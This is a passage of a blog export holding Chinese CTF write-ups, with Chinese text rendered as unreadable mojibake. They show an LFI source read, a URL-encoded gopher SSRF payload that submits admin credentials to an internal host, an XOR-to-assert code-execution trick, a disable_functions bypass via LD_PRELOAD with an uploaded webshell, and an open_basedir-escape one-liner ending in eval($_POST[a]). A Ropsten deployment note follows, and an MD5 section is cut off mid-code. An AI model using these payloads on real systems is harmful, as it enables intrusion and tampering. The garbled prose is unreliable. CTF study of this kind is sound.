<p>ä¼ å…¥<code>?file=php://filter/convert.base64-encode/resource=index.php</code>æŸ¥çœ‹index.phpçš„æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.phpå…³é”®ä»£ç </span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//ä½ å½“å‰ä½äºå­¦æ ¡172.17.0.0/24ç½‘æ®µä¸‹ å…¶å®è¿˜æœ‰å°æœºå­é‡Œé¢å¯ä»¥ä¿®æ”¹æˆç»© æˆ‘å·å·å‘Šè¯‰ä½ passwordæ˜¯123456,nameæ˜¯admin,//resultå¿…é¡»è¦æ”¹æˆ60 ä¸ç„¶å­¦æ ¡ä¼šæŸ¥çš„ï¼ï¼ï¼</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä»index.phpä¸­å¯ä»¥å¾—å‡ºå‡ ä¸ªç»“è®ºï¼š<br>1ï¼šnameä¸ºadminï¼Œpasswordä¸º123456ï¼Œresultä¸º60<br>2ï¼šç½‘æ®µæ˜¯172.17.0.0.&#x2F;24</p>
<p>å†ç”¨ä¼ªåè®®æŸ¥çœ‹å½“å‰ä¸»æœºçš„æ•æ„Ÿæ–‡ä»¶<code>/etc/hosts</code>å’Œ<code>/proc/net/arp</code>,å¾—åˆ°å¾ˆå¤šå†…ç½‘ipï¼Œfuzzä¸€ä¸‹ï¼Œå¾—åˆ°æœ€ç»ˆéœ€è¦çš„ä¸€ä¸ªå†…ç½‘ip<code>172.17.0.7</code><br><img src="/img/wp/2021/2021jike-3.png"></p>
<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>æ—¢ç„¶çŸ¥é“äº†ä¸»æœºç­‰ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¼€å§‹æ„é€ ssrfäº†ï¼Œä½¿ç”¨gopheråè®®æ‰“<br>æ„é€ poståŒ…</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">106.55.154.252:8010</span>/?url=gopher://<span class="hljs-number">172.17.0.7:80</span>/_POST /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">172.17.0.7:80</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">36</span><br><br><span class="hljs-attribute">name</span>=admin&amp;password=<span class="hljs-number">123456</span>&amp;result=<span class="hljs-number">60</span><br></code></pre></td></tr></table></figure>
<p>å°†ç©ºæ ¼ï¼Œå†’å·ï¼Œç­‰äºç”¨urlç¼–ç ï¼Œç»“å°¾æ¢è¡Œç”¨<code>%0d%0a</code>æ›¿æ¢</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">106.55.154.252:8010</span>/?url=gopher://<span class="hljs-number">172.17.0.7:80</span>/_POST%<span class="hljs-number">20</span>/index.php%<span class="hljs-number">20</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AHost%<span class="hljs-number">3</span>A%<span class="hljs-number">20172</span>.<span class="hljs-number">17</span>.<span class="hljs-number">0</span>.<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A80%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AContent-Type%<span class="hljs-number">3</span>A%<span class="hljs-number">20</span>application/x-www-form-urlencoded%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AContent-Length%<span class="hljs-number">3</span>A%<span class="hljs-number">2036</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aname%<span class="hljs-number">3</span>Dadmin%<span class="hljs-number">26</span>password%<span class="hljs-number">3</span>D123456%<span class="hljs-number">26</span>result%<span class="hljs-number">3</span>D60%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure>
<p>äºŒæ¬¡urlç¼–ç ï¼šå°†_åçš„æ‰€æœ‰å­—ç¬¦è¿›è¡Œurlç¼–ç </p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//<span class="hljs-number">106.55</span>.<span class="hljs-number">154.252</span>:<span class="hljs-number">8010</span>/?url<span class="hljs-operator">=</span>gopher://<span class="hljs-number">172.17</span>.<span class="hljs-number">0.7</span>:<span class="hljs-number">80</span>/_<span class="hljs-variable">%50</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%53</span><span class="hljs-variable">%54</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%48</span><span class="hljs-variable">%54</span><span class="hljs-variable">%54</span><span class="hljs-variable">%50</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%31</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%48</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%31</span><span class="hljs-variable">%37</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%37</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%41</span><span class="hljs-variable">%38</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%54</span><span class="hljs-variable">%79</span><span class="hljs-variable">%70</span><span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%61</span><span class="hljs-variable">%70</span><span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span>f<span class="hljs-variable">%78</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%2</span>d<span class="hljs-variable">%75</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%64</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%74</span><span class="hljs-variable">%68</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%33</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%44</span><span class="hljs-variable">%61</span><span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%36</span><span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%64</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%44</span><span class="hljs-variable">%31</span><span class="hljs-variable">%32</span><span class="hljs-variable">%33</span><span class="hljs-variable">%34</span><span class="hljs-variable">%35</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%36</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%44</span><span class="hljs-variable">%36</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><br></code></pre></td></tr></table></figure>

<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>1:æ¢è¡Œéœ€è¦ä½¿ç”¨<code>%0d%0a</code>æ›¿æ¢<br>2:<code>/etc/hosts</code>å’Œ<code>/proc/net/arp</code>æ˜¯æŸ¥çœ‹ç½‘ç»œä¿¡æ¯çš„æ•æ„Ÿæ–‡ä»¶</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021</tag>
        <tag>ssrf</tag>
        <tag>æå®¢æŒ‘æˆ˜</tag>
      </tags>
  </entry>
  <entry>
    <title>æå®¢æŒ‘æˆ˜2021-breakout-wp</title>
    <url>/posts/31724a07/</url>
    <content><![CDATA[<h1 id="é¢˜ç›®ä»£ç "><a href="#é¢˜ç›®ä»£ç " class="headerlink" title="é¢˜ç›®ä»£ç "></a>é¢˜ç›®ä»£ç </h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// è¿™äº›å¥‡æ€ªçš„ç¬¦å·æ˜¯ä»€ä¹ˆå‘¢?å­—ç¬¦ä¸²ä¹‹é—´è¿˜èƒ½å¼‚æˆ–çš„å—?</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v&#x27;</span>] ^ <span class="hljs-string">&#x27;!-__)^&#x27;</span>;<br><span class="hljs-comment">// ctfå¸¸è§çš„éªŒè¯ç å“¦!çº¯æ•°å­—å‘¢</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;auth&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>) == <span class="hljs-string">&quot;666666&quot;</span>) &#123;<br>    <span class="hljs-variable">$a</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h1><p>ä»£ç ä¼šå°†<code>v</code>å’Œ<code>!-__)^</code>è¿›è¡Œå¼‚æˆ–ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ å‡ºä¸€ä¸ªå€¼ï¼Œå¼‚æˆ–åä¸ºå‡½æ•°å<br>è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;!-__)^&quot;</span><br>b=<span class="hljs-string">&quot;assert&quot;</span>        //éœ€è¦çš„å‡½æ•°å<br>c=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    c+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(b[<span class="hljs-built_in">len</span>(c)])^<span class="hljs-built_in">ord</span>(i))<br><span class="hljs-built_in">print</span>(c)<br></code></pre></td></tr></table></figure>
<p>æ‰€ä»¥<code>v</code>çš„å€¼å°±ä¸º<code>@^,:[*</code><br><img src="/img/wp/2021/2021jike-4.png"></p>
<p>æ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªMD5çš„æˆªæ–­æ¯”è¾ƒï¼Œæ‰¾ä¸€ä¸ªMD5åå‰6ä½ä¸º<code>666666</code>çš„å€¼å³å¯ï¼Œä¾‹å¦‚<code>oT7mgbJMTNyh9qWYQT2d</code></p>
<p>codeå°±æ˜¯è¦æ‰§è¡Œçš„å†…å®¹äº†</p>
<p>ç°åœ¨å°†ä¸‰éƒ¨åˆ†è¿æ¥åœ¨ä¸€èµ·<br>æˆåŠŸæ‰§è¡Œphpinfo<br><img src="/img/wp/2021/2021jike-5.png"></p>
<h1 id="ç»•è¿‡disable-function"><a href="#ç»•è¿‡disable-function" class="headerlink" title="ç»•è¿‡disable_function"></a>ç»•è¿‡disable_function</h1><p>æœ‰äº†phpinfoï¼Œè‚¯å®šè¦çœ‹ä¸€ä¸‹<code>disable_functions</code><br>å¯ä»¥çœ‹åˆ°å¸¸ç”¨çš„systemç­‰åŸºæœ¬éƒ½è¢«ç¦ç”¨äº†</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,dl,<span class="hljs-keyword">exec</span>,<span class="hljs-keyword">system</span>,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,apache_setenv,<span class="hljs-keyword">symlink</span>,<span class="hljs-keyword">link</span>,error_log,iconv<br></code></pre></td></tr></table></figure>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ç»•è¿‡<code>disable_function</code><br>å…ˆç”¨èšå‰‘è¿ä¸Šï¼Œæ–¹ä¾¿æ“ä½œ<br><img src="/img/wp/2021/2021jike-6.png"><br><img src="/img/wp/2021/2021jike-7.png"></p>
<p>ç»•è¿‡disable_functionæœ‰å¾ˆå¤šç§æ–¹æ³•ï¼Œä½†è¿™é‡Œå¤§éƒ½è¢«ç¦ç”¨äº†ï¼Œæ‰€ä»¥æœ€åé‡‡ç”¨çš„æ˜¯åˆ©ç”¨ LD_PRELOAD ç¯å¢ƒå˜é‡æ¥ç»•è¿‡<br>é¦–å…ˆä¸‹è½½<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">ç»•è¿‡ä»£ç </a><br>éœ€è¦ç”¨åˆ°å¦‚ä¸‹è¿™4ä¸ªæ–‡ä»¶<br><img src="/img/wp/2021/2021jike-8.png"></p>
<blockquote>
<p>bypass_disablefunc.phpï¼šä¸€ä¸ªç”¨æ¥æ‰§è¡Œå‘½ä»¤çš„ webshellã€‚<br>bypass_disablefunc_x64.soæˆ–bypass_disablefunc_x86.soï¼šæ‰§è¡Œå‘½ä»¤çš„å…±äº«å¯¹è±¡æ–‡ä»¶ï¼Œåˆ†ä¸º64ä½çš„å’Œ32ä½çš„ã€‚<br>bypass_disablefunc.cï¼šç”¨æ¥ç¼–è¯‘ç”Ÿæˆä¸Šé¢çš„å…±äº«å¯¹è±¡æ–‡ä»¶ã€‚</p>
</blockquote>
<p>å¯¹äºbypass_disablefunc.phpï¼Œå¦‚æœæœ‰æƒé™å°±ä¸Šä¼ åˆ°webç›®å½•ç›´æ¥è®¿é—®ï¼Œæ— æƒé™çš„è¯å¯ä»¥ä¼ åˆ°tmpç›®å½•åç”¨includeç­‰å‡½æ•°æ¥åŒ…å«ï¼Œå¹¶ä¸”éœ€è¦ç”¨ GET æ–¹æ³•æä¾›ä¸‰ä¸ªå‚æ•°ï¼š</p>
<p>cmd å‚æ•°ï¼šå¾…æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚ id å‘½ä»¤ã€‚<br>outpath å‚æ•°ï¼šä¿å­˜å‘½ä»¤æ‰§è¡Œè¾“å‡ºç»“æœçš„æ–‡ä»¶è·¯å¾„ï¼ˆå¦‚ &#x2F;tmp&#x2F;xxï¼‰ï¼Œä¾¿äºåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºï¼Œå¦å¤–è¯¥å‚æ•°ï¼Œä½ åº”æ³¨æ„ web æ˜¯å¦æœ‰è¯»å†™æƒé™ã€web æ˜¯å¦å¯è·¨ç›®å½•è®¿é—®ã€æ–‡ä»¶å°†è¢«è¦†ç›–å’Œåˆ é™¤ç­‰å‡ ç‚¹ã€‚<br>sopath å‚æ•°ï¼šæŒ‡å®šåŠ«æŒç³»ç»Ÿå‡½æ•°çš„å…±äº«å¯¹è±¡çš„ç»å¯¹è·¯å¾„ï¼ˆå¦‚ &#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.soï¼‰ï¼Œå¦å¤–å…³äºè¯¥å‚æ•°ï¼Œä½ åº”æ³¨æ„ web æ˜¯å¦å¯è·¨ç›®å½•è®¿é—®åˆ°å®ƒã€‚</p>
<p>åœ¨å›è¿‡å¤´æ¥çœ‹é¢˜ç›®ï¼Œ<code>/var/www/html</code>ç›®å½•æ˜¯æ²¡æœ‰æƒé™çš„ï¼Œ<code>/tmp</code>ç›®å½•å¯è¯»å¯å†™ï¼Œæ‰€ä»¥å°†æ–‡ä»¶ä¸Šä¼ åˆ°<code>/tmp</code>ç›®å½•ä¸‹<br><img src="/img/wp/2021/2021jike-9.png"><br>åœ¨codeä¸­ç”¨æ–‡ä»¶åŒ…å«è°ƒç”¨<code>bypass_disablefunc.php</code><br><img src="/img/wp/2021/2021jike-10.png"><br>ç„¶åGETä¼ å…¥ä¸‰ä¸ªå‚æ•°<br><img src="/img/wp/2021/2021jike-11.png"><br>ä¼šå‘ç°æ— æ³•æ‰§è¡Œ</p>
<p>æ£€æŸ¥ä¸€ä¸‹bypass_disablefunc.phpä¸­çš„ä»£ç <br><img src="/img/wp/2021/2021jike-12.png"><br>æ¯”è¾ƒåå‘ç°<code>mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</code>ä¸­çš„mailè¢«ç¦ç”¨äº†<br>å¯ä»¥ä½¿ç”¨<code>mail</code>çš„å°è£…å‡½æ•°<code>mb_send_mail</code>æ¥ç»•è¿‡<br><img src="/img/wp/2021/2021jike-13.png"><br>æˆåŠŸç»•è¿‡<br><img src="/img/wp/2021/2021jike-14.png"><br>æ‰§è¡Œ<code>ls /</code>åæ‰§è¡Œ<code>/readflag</code>å³å¯æ‹¿åˆ°flag<br><img src="/img/wp/2021/2021jike-15.png"></p>
<h1 id="ç»•è¿‡open-basedir"><a href="#ç»•è¿‡open-basedir" class="headerlink" title="ç»•è¿‡open_basedir"></a>ç»•è¿‡open_basedir</h1><p>çœ‹åˆ°è¿™ä¸ªç¯å¢ƒè¿˜ä¸é”™ï¼Œé¡ºæ‰‹è¯•äº†ä¸€ä¸‹ç»•è¿‡<code>open_basedir</code><br>å› ä¸ºæ˜¯é™æ€é¶æœºï¼Œæ‰€ä»¥èƒ½çœ‹åˆ°å…¶ä»–å¸ˆå‚…çš„é©¬ï¼Œç›´æ¥åŒ…å«ï¼Œä¸ç”¨åœ¨ä¸Šä¼ äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;/tmp/test&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;/tmp/test&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]); <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>
<p>å“ˆå“ˆå“ˆå“ˆï¼Œåœ¨çº¿èŠå¤©å®¤<br><img src="/img/wp/2021/2021jike-16.png"><br>èšå‰‘è¿æ¥<br><img src="/img/wp/2021/2021jike-17.png"><br>å¯ä»¥çœ‹åˆ°æ ¹ç›®å½•æ–‡ä»¶äº†<br><img src="/img/wp/2021/2021jike-18.png"></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™ä¸€é¢˜è€ƒç‚¹å¾ˆå¤šï¼Œå¹¶æ²¡æœ‰è¡¨é¢é‚£ä¹ˆç®€å•ï¼Œå­¦åˆ°å¾ˆå¤šæ–°å§¿åŠ¿</p>
<p>ç‰¹åˆ«é¸£è°¢ï¼š<a href="https://l-helianthus.github.io/">@Hel1antHu5</a>å¸ˆå‚…<br>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/articles/network/263540.html">ç»•è¿‡Disable Functionsæ¥æäº‹æƒ…</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021</tag>
        <tag>æå®¢æŒ‘æˆ˜</tag>
        <tag>disable_function</tag>
      </tags>
  </entry>
  <entry>
    <title>åœ¨Rosptenæµ‹è¯•é“¾éƒ¨ç½²ä¸€ä¸ªåˆçº¦</title>
    <url>/posts/19317a18/</url>
    <content><![CDATA[<h1 id="åŸºç¡€å‡†å¤‡"><a href="#åŸºç¡€å‡†å¤‡" class="headerlink" title="åŸºç¡€å‡†å¤‡"></a>åŸºç¡€å‡†å¤‡</h1><p>é¦–å…ˆï¼Œéœ€è¦ä¸€ä¸ªé’±åŒ…æ’ä»¶<code>MetaMask</code>,å®‰è£…è¿‡ç¨‹å°±ä¸å¤šè¯´äº†ï¼Œç™¾åº¦æœ‰å¾ˆå¤šæ•™ç¨‹<br>é€‰æ‹©ä¸€ä¸ª<a href="http://remix.ethereum.org/">åœ¨çº¿ide</a></p>
<h1 id="éƒ¨ç½²åˆçº¦"><a href="#éƒ¨ç½²åˆçº¦" class="headerlink" title="éƒ¨ç½²åˆçº¦"></a>éƒ¨ç½²åˆçº¦</h1><p>é¦–å…ˆåœ¨é»˜è®¤ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ³¨æ„ä»¥solä¸ºåç¼€å<br><img src="/img/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%83%A8%E7%BD%B2%E5%90%88%E7%BA%A6-1.png"></p>
<p>å†™ä¸Šä½ çš„åˆçº¦ä»£ç <br>å¹¶é€‰æ‹©ç¼–è¯‘å™¨ç‰ˆæœ¬ï¼Œç¼–è¯‘æˆåŠŸåå¦‚å›¾æ‰€ç¤ºä¼šå‡ºç°ç¼–è¯‘æˆåŠŸçš„æ ‡å¿—<br><img src="/img/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%83%A8%E7%BD%B2%E5%90%88%E7%BA%A6-2.png"></p>
<p>æœ€åéƒ¨ç½²åˆçº¦ï¼Œé€‰æ‹©â€œInjected Web3â€ï¼Œè¡¨ç¤ºæˆ‘ä»¬è¦ä½¿ç”¨MetaMaskæ³¨å…¥çš„Web3ç¯å¢ƒï¼Œå¦‚æœå·²æ­£ç¡®è¿æ¥MetaMaskï¼Œå¯ä»¥çœ‹åˆ°â€œRopsten (3) networkâ€ï¼Œè¡¨ç¤ºå·²è¿æ¥åˆ°Ropstenæµ‹è¯•ç½‘ã€‚<br>ç‚¹å‡»deployåä¼šå¼¹å‡ºMetaMaskçš„äº¤æ˜“ç­¾åç¡®è®¤ï¼Œç¡®è®¤åéƒ¨ç½²åˆçº¦çš„äº¤æ˜“å³è¢«å‘é€è‡³æµ‹è¯•é“¾<br><img src="/img/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%83%A8%E7%BD%B2%E5%90%88%E7%BA%A6-3.png"></p>
<p>åœ¨MetaMaskä¸­æŸ¥çœ‹åˆçº¦<br><img src="/img/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%83%A8%E7%BD%B2%E5%90%88%E7%BA%A6-4.png"></p>
]]></content>
      <categories>
        <category>åŒºå—é“¾</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
        <tag>åŒºå—é“¾</tag>
        <tag>rospten</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFä¸­å…³äºmd5çš„ä¸€äº›æ€»ç»“</title>
    <url>/posts/ad669f62/</url>
    <content><![CDATA[<h1 id="MD5å¼±ç±»å‹æ¯”è¾ƒ"><a href="#MD5å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="MD5å¼±ç±»å‹æ¯”è¾ƒ"></a>MD5å¼±ç±»å‹æ¯”è¾ƒ</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span 